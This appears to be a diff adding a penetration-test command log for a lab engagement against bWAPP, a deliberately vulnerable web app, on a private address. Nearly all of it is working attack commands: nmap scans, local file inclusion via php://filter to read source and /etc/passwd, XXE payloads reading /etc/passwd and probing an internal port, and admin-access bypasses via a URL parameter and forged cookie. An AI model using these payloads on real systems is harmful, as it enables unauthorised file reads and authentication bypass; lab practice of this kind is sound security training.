@@ -1,0 +1,34 @@
+# Mission 2026-03-19-001 — bWAPP @ 10.10.30.128
+# Commands log initialized 2026-03-19
+# Phase execution commands will be appended below during active mission phases.
+# RECON PHASE — 2026-03-19
+ping -c 2 10.10.30.128
+curl -siL http://10.10.30.128/
+curl -si -c /tmp/bwapp_session.txt -X POST http://10.10.30.128/login.php -d "login=bee&password=bug&security_level=0&form=submit"
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/phpinfo.php" | grep -i "document_root\|open_basedir\|allow_url"
+curl -s "http://10.10.30.128/robots.txt"
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php" | grep -E "(title|form|input)"
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/smgmt_admin_portal.php?admin=1"
+# SCAN PHASE — 2026-03-19
+nmap -sV -sC -p 80,443,8080,8443,21,22,3306,8000,8888 10.10.30.128
+nmap -p- --min-rate 2000 10.10.30.128
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=bugs.txt&action=go" | grep -oP '[A-Za-z0-9+/]{40,}' | head -3 | xargs base64 -d
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/xxe-1.php"
+curl -s -o /dev/null -w "%{http_code}" -b /tmp/bwapp_session.txt "http://10.10.30.128/xxe-1.php"
+# ENUM + EXPLOIT PHASE — 2026-03-19
+# LFI source reads
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=rlfi.php&action=go" | grep -oP '[A-Za-z0-9+/]{100,}={0,2}' | head -1 | base64 -d
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=xxe-2.php&action=go" | grep -oP '[A-Za-z0-9+/]{100,}={0,2}' | head -1 | base64 -d
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=smgmt_admin_portal.php&action=go" | grep -oP '[A-Za-z0-9+/]{100,}={0,2}' | head -1 | base64 -d
+# LFI exploit — sensitive files
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=/etc/passwd&action=go"
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/rlfi.php?language=php://filter/convert.base64-encode/resource=admin/settings.php&action=go" | grep -oP '[A-Za-z0-9+/]{30,}={0,2}' | head -1 | base64 -d
+# XXE exfil — xxe-2.php
+curl -s -b /tmp/bwapp_session.txt -X POST http://10.10.30.128/xxe-2.php -H "Content-Type: text/xml; charset=UTF-8" --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE reset [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><reset><login>bee</login><secret>&xxe;</secret></reset>'
+# SSRF via XXE — port probe
+curl -s -b /tmp/bwapp_session.txt -X POST http://10.10.30.128/xxe-2.php -H "Content-Type: text/xml; charset=UTF-8" --data-raw '<?xml version="1.0" encoding="utf-8"?><!DOCTYPE reset [<!ENTITY xxe SYSTEM "http://127.0.0.1:3306/">]><reset><login>bee</login><secret>&xxe;</secret></reset>'
+# Broken auth low (URL param)
+curl -s -b /tmp/bwapp_session.txt "http://10.10.30.128/smgmt_admin_portal.php?admin=1"
+# Broken auth medium (cookie)
+curl -si -c /tmp/bwapp_medium.txt -X POST http://10.10.30.128/login.php -d "login=bee&password=bug&security_level=1&form=submit"
+curl -s -b "PHPSESSID=aobr4qtmnphv9jmh0v2v22g5t3; security_level=1; admin=1" "http://10.10.30.128/smgmt_admin_portal.php"
